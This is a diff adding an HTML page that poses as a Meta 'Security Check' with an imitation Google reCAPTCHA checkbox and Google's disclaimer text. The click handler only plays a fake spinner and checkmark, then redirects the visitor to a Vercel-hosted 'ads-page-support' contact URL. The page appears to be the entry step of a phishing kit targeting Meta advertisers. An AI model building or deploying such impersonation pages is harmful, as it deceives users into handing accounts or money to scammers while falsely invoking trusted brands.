@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #ffffff;
+        }
+
+        .container {
+            width: 304px;
+            margin-top: 15vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .meta-logo {
+            height: 13px;
+            margin-bottom: 12px;
+            align-self: flex-start;
+            margin-left: 2px;
+            object-fit: contain;
+        }
+
+        .recaptcha-container {
+            border: 1px solid #d3d3d3;
+            background: #f9f9f9;
+            border-radius: 3px;
+            width: 304px;
+            height: 74px;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            box-sizing: border-box;
+            margin-bottom: 14px;
+            box-shadow: 0px 0px 4px 1px rgba(0, 0, 0, 0.08);
+        }
+
+        .checkbox-container {
+            width: 28px;
+            height: 28px;
+            margin-right: 12px;
+            position: relative;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .checkbox-border {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background-color: #fff;
+            position: absolute;
+            top: 0;
+            left: 0;
+            transition: box-shadow 0.2s;
+            box-sizing: border-box;
+        }
+
+        .checkbox-container:hover .checkbox-border {
+            box-shadow: 0px 0px 4px 1px rgba(0, 0, 0, 0.2);
+        }
+
+        .spinner {
+            display: none;
+            width: 28px;
+            height: 28px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            box-sizing: border-box;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .checkmark {
+            display: none;
+            width: 28px;
+            height: 28px;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .checkmark::after {
+            content: '';
+            position: absolute;
+            left: 10px;
+            top: 3px;
+            width: 5px;
+            height: 13px;
+            border: solid #009e55;
+            border-width: 0 3px 3px 0;
+            transform: rotate(45deg);
+        }
+
+        .recaptcha-text {
+            font-size: 14px;
+            color: #222;
+            flex-grow: 1;
+            font-weight: 400;
+        }
+
+        .recaptcha-logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 60px;
+            flex-shrink: 0;
+        }
+
+        .recaptcha-logo-container img {
+            width: 30px;
+            height: 30px;
+            margin-bottom: 2px;
+        }
+
+        .recaptcha-links {
+            font-size: 9px;
+            color: #555;
+            text-align: center;
+            line-height: 1.2;
+        }
+
+        .recaptcha-links a {
+            color: #555;
+            text-decoration: none;
+        }
+
+        .recaptcha-links a:hover {
+            text-decoration: underline;
+        }
+
+        .info-text {
+            font-size: 11px;
+            color: #737373;
+            line-height: 1.45;
+            text-align: left;
+            width: 290px;
+            align-self: flex-start;
+        }
+
+        .info-text p {
+            margin-top: 0;
+            margin-bottom: 14px;
+        }
+
+        .info-text a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+
+        .bottom-spinner {
+            display: none;
+            position: fixed;
+            bottom: 20%;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999;
+        }
+
+        .bottom-spinner-circle {
+            border: 2px solid #e5e5e5;
+            border-top: 2px solid #1877f2;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <!-- Meta Logo -->
+        <img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg"
+            alt="Meta">
+
+        <!-- reCAPTCHA widget -->
+        <div class="recaptcha-container">
+            <div class="checkbox-container" id="checkbox-container">
+                <div class="checkbox-border" id="checkbox-border"></div>
+                <div class="spinner" id="spinner"></div>
+                <div class="checkmark" id="checkmark"></div>
+            </div>
+            <div class="recaptcha-text">I'm not a robot</div>
+            <div class="recaptcha-logo-container">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
+                <div class="recaptcha-links">
+                    reCAPTCHA<br>
+                    <a href="https://policies.google.com/privacy?hl=en" target="_blank">Privacy</a> - <a
+                        href="https://policies.google.com/terms?hl=en" target="_blank">Terms</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Info Text -->
+        <div class="info-text">
+            <p>This helps us to combat harmful conduct, detect and prevent spam, and maintain the integrity of our
+                Products.</p>
+            <p>We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA
+                Enterprise is subject to Google's <a href="https://policies.google.com/privacy" target="_blank">Privacy
+                    Policy</a> and <a href="https://policies.google.com/terms" target="_blank">Terms of Use</a>.</p>
+            <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and
+                sends it to Google to provide, maintain and improve reCAPTCHA Enterprise and for general security
+                purposes. This information is not used by Google for personalized advertising.</p>
+        </div>
+    </div>
+
+    <!-- Bottom Spinner -->
+    <div id="loading-screen" class="bottom-spinner">
+        <div class="bottom-spinner-circle"></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const checkboxContainer = document.getElementById('checkbox-container');
+            const checkboxBorder = document.getElementById('checkbox-border');
+            const spinner = document.getElementById('spinner');
+            const checkmark = document.getElementById('checkmark');
+            const bottomSpinner = document.getElementById('loading-screen');
+            let isClicked = false;
+
+            checkboxContainer.addEventListener('click', function () {
+                if (isClicked) return;
+                isClicked = true;
+
+                checkboxBorder.style.display = 'none';
+                spinner.style.display = 'block';
+
+                setTimeout(function () {
+                    spinner.style.display = 'none';
+                    checkmark.style.display = 'block';
+
+                    setTimeout(function () {
+                        bottomSpinner.style.display = 'block';
+
+                        setTimeout(function () {
+                            window.location.href = "https://ads-page-support.vercel.app/contact/1780799279047/";
+                        }, 2000); // Chuyển trang sau 2 giây hiện vòng quay xanh
+                    }, 500);
+                }, 1500);
+            });
+        });
+    </script>
+
+</body>
+
+</html>
